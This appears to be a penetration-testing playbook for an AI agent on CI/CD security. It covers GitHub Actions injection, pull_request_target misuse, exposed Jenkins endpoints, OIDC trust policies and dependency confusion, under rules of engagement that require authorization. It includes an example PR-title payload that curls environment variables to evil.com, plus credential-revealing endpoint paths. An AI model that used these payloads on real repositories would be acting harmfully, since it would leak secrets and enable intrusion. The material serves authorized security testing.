# CI/CD Pipeline Security

## Scope and preconditions

Applies when the target has exposed CI/CD infrastructure: GitHub Actions workflows,
GitLab CI pipelines, Jenkins instances, CircleCI, or when you can view repository
workflow files. Common entry points: `.github/workflows/` files in public repos,
exposed Jenkins at `/script`, GitLab CI API, build artifact URLs, or CI-related
headers in HTTP responses.

It does **not** cover: general dependency analysis (use `supply-chain`), code
review for application vulnerabilities, or infrastructure scanning beyond CI/CD.

## Rules of engagement

- MUST have explicit authorization to test CI/CD systems. These are production
  infrastructure — unauthorized testing can disrupt deployments.
- NEVER trigger pipelines that deploy to production environments.
- NEVER exfiltrate real secrets. Demonstrate the vulnerability by proving access
  to the secret mechanism (e.g., print secret length, first/last character).
- MUST use only test repositories or branches authorized for testing.
- MUST coordinate with the target's DevOps team before testing self-hosted runners.

## Workflow

- [ ] 1. Discover CI/CD infrastructure from web proxy data
- [ ] 2. Analyze workflow files for injection points
- [ ] 3. Test GitHub Actions workflow injection
- [ ] 4. Test pull_request_target misuse
- [ ] 5. Test for exposed CI endpoints
- [ ] 6. Test OIDC trust boundaries
- [ ] 7. Test dependency confusion
- [ ] 8. Record findings

## Step 1: Discover CI/CD infrastructure

### Goal
Identify CI/CD systems in use from captured HTTP traffic.

### Actions
Use `search_responses` and `get_endpoints` to find:
- GitHub API calls referencing workflows (`/repos/.*/actions/`)
- GitLab CI API endpoints (`/api/v4/projects/.*/pipelines`)
- Jenkins URLs (`/job/`, `/script`, `/manage`, `/view/`)
- Build artifact URLs (`/artifacts/`, `/builds/`, `/_artifacts/`)
- CI-related headers: `X-GitHub-Request-Id`, `X-GitLab-*`, `Jenkins-*`
- Status badge images (`/badge.svg`, `/builds/status`)

Look for `.github/workflows/*.yml` in any accessible repository. These are
always public in public repos and often contain injection vectors.

## Step 2: Analyze workflow files

### Goal
Identify injectable context variables and unsafe patterns.

### Dangerous pattern (VULNERABLE):
```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```
The `${{ }}` expression is interpolated BEFORE the shell runs, so a PR title
containing `"; curl https://evil.com/$(env | base64) #` achieves command injection.

### Safe pattern:
```yaml
- run: echo "PR title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```
Environment variables are not shell-interpreted.

### Injectable context variables (attacker-controlled):
| Variable | Attacker controls via |
|---|---|
| `github.event.pull_request.title` | PR title |
| `github.event.pull_request.body` | PR description |
| `github.head_ref` | Branch name |
| `github.event.comment.body` | Issue/PR comment |
| `github.event.review.body` | PR review |
| `github.event.inputs.*` | Manual workflow dispatch |
| `github.event.discussion.title` | Discussion title |
| `github.event.discussion.body` | Discussion body |
| `github.event.pages.*.page_name` | Wiki page name |

## Step 3: Test workflow injection

### Goal
Confirm command injection via workflow interpolation.

### Actions
If you can create a PR or issue comment on the target repo:
1. Set the PR title to a detection payload: `test"; echo VOID_INJECTION_TEST #`
2. Check if the workflow runs and if the injection text appears in the logs.
3. For secret exfiltration PoC (authorized only): use DNS-based exfiltration
   since stdout may not be visible.

If you cannot trigger the workflow, analyze the YAML statically:
- Search for `${{ github.event.` in `run:` blocks (direct injection)
- Search for `${{ github.event.` in `uses:` with version (not pinned to SHA)
- Check if `pull_request_target` triggers exist

## Step 4: Test pull_request_target

### Goal
Identify workflows that run PR code with base repo secrets.

### Technique
`pull_request_target` runs in the context of the BASE branch (with secrets)
but can be configured to check out the PR branch code. This means:

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
      - run: npm test  # Runs PR code with base repo secrets
```

A malicious PR can modify `package.json` scripts, test files, or build configs
to exfiltrate secrets. This is a Critical finding.

### What to look for
- `pull_request_target` trigger with `actions/checkout` referencing `head.sha` or `head.ref`
- Any workflow that runs PR-supplied code/scripts with access to `secrets.*`

## Step 5: Test exposed CI endpoints

### Goal
Find CI admin panels and API endpoints accessible without proper auth.

### Actions
Use `send_request` to probe common paths:

| CI System | Path | What it reveals |
|---|---|---|
| Jenkins | `/script` | Groovy console — RCE if accessible |
| Jenkins | `/credentials/` | Stored credentials |
| Jenkins | `/env` | Environment variables (may contain secrets) |
| GitLab | `/api/v4/projects?membership=false` | All projects |
| Drone | `/api/repos` | Repository list with secrets metadata |
| CircleCI | `/api/v2/project/` | Build configurations |

Also check for actuator-style endpoints: `/actuator/env`, `/debug/vars`.

## Step 6: Test OIDC trust boundaries

### Goal
Determine if cloud IAM roles trust CI/CD tokens too broadly.

### Technique
GitHub Actions can request OIDC tokens for cloud access (AWS, GCP, Azure).
The trust policy should be narrow:

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:org/specific-repo:ref:refs/heads/main"
    }
  }
}
```

A broad policy like `"StringLike": {"sub": "repo:org/*"}` allows ANY repo in
the org to assume the role. Look for:
- Wildcard in the `sub` claim condition
- Missing `ref` restriction (any branch can assume the role)
- Trust policies in Terraform state files, CloudFormation templates, or docs

## Step 7: Test dependency confusion

### Goal
Identify internal package names that could be squatted on public registries.

### Actions
Use `search_responses` to find:
- `package-lock.json`, `yarn.lock` — look for scoped packages (`@company/pkg`)
  and check if the scope exists on npmjs.com
- `requirements.txt`, `Pipfile.lock` — look for packages with internal-looking
  names and check PyPI
- `go.sum` — internal Go module paths
- Private registry URLs that reveal package names

If an internal package name is available on the public registry, dependency
confusion is possible.

## Step 8: Record the finding

Use `add_pentest_finding` with:
- The specific workflow file and line number with the vulnerability
- The injectable variable or exposed endpoint
- PoC showing how an attacker would trigger it
- Severity based on what secrets/environments are accessible

## Known false positives

- Workflow files that use `${{ }}` in non-`run` contexts (e.g., `if:` conditions)
  are generally not injectable — the expression is evaluated by GitHub, not a shell.
- Jenkins `/script` that returns 403 or redirect to login — not accessible.
- Dependency names that look internal but are actually public packages maintained
  by the organization.
- `pull_request_target` that only runs safe actions (labeling, commenting) without
  checking out PR code.

## Reminder

CI/CD injection is command injection with access to deployment secrets. The
highest-impact pattern is `pull_request_target` + PR code checkout — it gives
an external contributor RCE with the base repo's secrets. Always check
`pull_request_target` first. The three things that make a CI/CD finding:
**attacker-controlled input reaches a shell**, **secrets are accessible in that
context**, and **you can demonstrate the injection path**.
